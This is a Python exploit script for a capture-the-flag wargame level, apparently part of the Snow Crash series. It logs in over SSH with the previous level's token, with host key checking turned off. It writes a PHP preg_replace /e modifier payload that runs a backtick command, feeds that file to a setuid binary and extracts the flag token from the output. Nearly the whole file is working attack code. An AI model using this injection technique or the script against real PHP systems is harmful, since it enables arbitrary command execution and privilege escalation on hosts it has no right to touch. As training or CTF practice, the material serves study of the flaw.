"""
Level06 - PHP /e Modifier Code Injection

Objective:
    Exploit deprecated /e modifier in preg_replace() to execute code as flag06.

Vulnerability:
    PHP /e modifier evaluates replacement string as PHP code without sanitization.

Usage:
    python3 exploit.py
"""

import subprocess
import sys
import re


# ============================================================================
# Helper Functions
# ============================================================================

def ssh_cmd(host, port, user, pwd, cmd):
    """Execute SSH command."""
    try:
        result = subprocess.run(
            [
                "sshpass",
                "-p",
                pwd,
                "ssh",
                "-o",
                "StrictHostKeyChecking=no",
                "-p",
                str(port),
                f"{user}@{host}",
                cmd,
            ],
            capture_output=True,
            text=True,
            timeout=10,
        )
        return result.returncode, result.stdout, result.stderr
    except:
        return -1, "", ""


# ============================================================================
# Exploitation
# ============================================================================

def exploit(host, port, ssh_port, pwd):
    """Execute PHP /e modifier code injection."""
    print(f"[*] Connecting to level06@{host}:{ssh_port}")
    code, out, err = ssh_cmd(host, ssh_port, "level06", pwd, "id")
    if code != 0:
        print("[!] SSH connection failed")
        return False, ""
    print(f"[+] SSH OK: {out.strip()}\n")

    print("[*] Creating PHP /e modifier injection payload...")
    payload = "[x ${`getflag`}]"
    create_cmd = f"printf '{payload}\\n' > /tmp/level06_exploit.txt"
    ssh_cmd(host, ssh_port, "level06", pwd, create_cmd)

    print("[*] Executing exploit via setuid binary...")
    cmd = "cd /home/user/level06 && ./level06 /tmp/level06_exploit.txt 2>&1"
    code, out, err = ssh_cmd(host, ssh_port, "level06", pwd, cmd)

    full_output = out + err

    if code == 0 or "token" in full_output.lower():
        print(f"[+] Exploit executed!")
        clean_out = full_output.replace(" x ", ".")
        match = re.search(r"token\s*:\s*([a-zA-Z0-9_-]+)", clean_out)
        if match:
            token = match.group(1)
            print(f"[+] Token found: {token}")
            return True, token
        return True, full_output.strip()

    print(f"[!] Failed. Code: {code}")
    return False, ""


# ============================================================================
# Main
# ============================================================================

def main():
    print("Level06 PHP /e Modifier Injection Exploit\n")

    try:
        with open("level05/flag", "r") as f:
            pwd = f.read().strip()
        print(f"[+] Level05 token: {pwd}\n")
    except:
        print("[!] Could not read level05 token")
        sys.exit(1)

    success, token = exploit("localhost", 4747, 4242, pwd)

    if success:
        print("\n[SUMMARY]")
        print(f"  Vulnerability: PHP preg_replace() /e modifier code injection")
        print(f"  Attack: Backtick command execution in /e modifier context")
        print(f"  Result: Arbitrary shell command execution\n")
        print(f"[ANSWER]")
        print(f"  Level06 Token: {token}")
    else:
        print("[!] Exploit failed")
        sys.exit(1)


if __name__ == "__main__":
    main()
